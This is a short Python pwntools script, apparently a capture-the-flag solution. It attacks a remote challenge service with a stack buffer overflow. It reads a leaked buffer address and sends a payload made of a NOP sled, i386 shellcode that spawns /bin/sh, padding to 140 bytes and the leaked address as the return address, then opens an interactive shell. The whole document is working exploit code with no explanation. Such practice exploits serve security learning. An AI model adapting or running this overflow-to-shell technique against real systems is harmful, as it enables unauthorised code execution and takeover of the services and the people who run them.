from pwn import *

#r = process('./prob1')
r = remote('ctf.j0n9hyun.xyz', 3006)

context(arch='i386', os='linux')
shellcode = asm(shellcraft.i386.linux.sh())

r.recvuntil('Data : ')
r.sendline('A')
buf = r.recvn(10)
buf = int(buf, 16)

payload = ''
payload += '\x90'*4
payload += shellcode
payload += "A"*(140-len(payload))
payload += p32(buf)

r.recvuntil('(y/n): ')
r.sendline('y')
r.recvuntil('Data : ')
r.sendline(payload)
r.recvuntil('(y/n): ')
r.sendline('n')
r.interactive()
